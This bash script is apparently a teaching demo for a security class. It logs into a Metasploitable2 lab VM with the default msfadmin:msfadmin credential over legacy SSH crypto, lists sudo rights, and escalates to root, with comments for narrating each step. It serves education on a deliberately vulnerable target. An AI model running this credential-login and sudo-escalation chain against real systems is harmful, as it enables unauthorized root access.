#!/usr/bin/env bash
# Day 17 — Path A live demo: low-priv shell -> privilege escalation on Metasploitable2.
# Run this FROM THE WSL UBUNTU TERMINAL. No Metasploit needed.
#   bash demo-privesc-msf2.sh
#
# What it does, so you can narrate it live:
#   1. SSHes into Metasploitable2 as `msfadmin` / `msfadmin` — a DEFAULT/weak credential,
#      which is itself a real initial-access technique (not every foothold needs an exploit).
#   2. Shows `id` — you land as a normal user (uid 1000), NOT root.
#   3. Runs `sudo -l` — shows msfadmin can run (ALL) ALL. That's the misconfiguration: this
#      account should not have unrestricted sudo.
#   4. Uses that sudo (password = msfadmin again) to become root and proves it with `id`.
#
# This is the "something powerful trusts something you control" pattern from the slide:
# sudo trusts msfadmin completely, and you control msfadmin via its weak password.
#
# NOTE on SSH flags: Metasploitable2's sshd is from 2010 and only offers host keys / key
# exchange / ciphers modern OpenSSH disables by default. The -o flags below re-enable just
# enough legacy crypto to talk to it — this is ONLY safe because this is an isolated lab box
# you are deliberately attacking, never do this against anything else.
#
# Verified against this lab 2026-10-05: Metasploitable2 10.89.1.10.

set -u
TARGET="10.89.1.10"
USER="msfadmin"
PASS="msfadmin"

if ! command -v sshpass >/dev/null 2>&1; then
  echo "[*] Installing sshpass (one-time) ..."
  sudo apt-get install -y sshpass
fi

SSH_OPTS=(
  -o StrictHostKeyChecking=no -o ConnectTimeout=5
  -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=+ssh-rsa
  -oKexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1
  -oCiphers=+aes128-cbc,3des-cbc
)

echo "=========================================================="
echo "[*] Step 1 — log in with a default credential ($USER:$PASS)"
echo "=========================================================="
sshpass -p "$PASS" ssh "${SSH_OPTS[@]}" "$USER@$TARGET" "echo '--- id (we are NOT root) ---'; id"

echo
echo "=========================================================="
echo "[*] Step 2 — what can this user run with sudo?"
echo "=========================================================="
sshpass -p "$PASS" ssh "${SSH_OPTS[@]}" "$USER@$TARGET" "echo '$PASS' | sudo -S -l 2>&1 | tail -5"

echo
echo "=========================================================="
echo "[*] Step 3 — take it: escalate to root and prove it"
echo "=========================================================="
sshpass -p "$PASS" ssh "${SSH_OPTS[@]}" "$USER@$TARGET" \
  "echo '$PASS' | sudo -S id; echo '$PASS' | sudo -S whoami"

echo
echo "[*] That's the chain: weak credential (msfadmin:msfadmin) -> unrestricted sudo -> root."
echo "[*] For your Engagement Journal screenshot: start user -> sudo -l output -> root id."
echo
echo "[*] Want a LIVE interactive root shell to type in front of the class? Run:"
echo "    sshpass -p $PASS ssh ${SSH_OPTS[*]} $USER@$TARGET"
echo "    then at the prompt: sudo -s   (password: $PASS)"
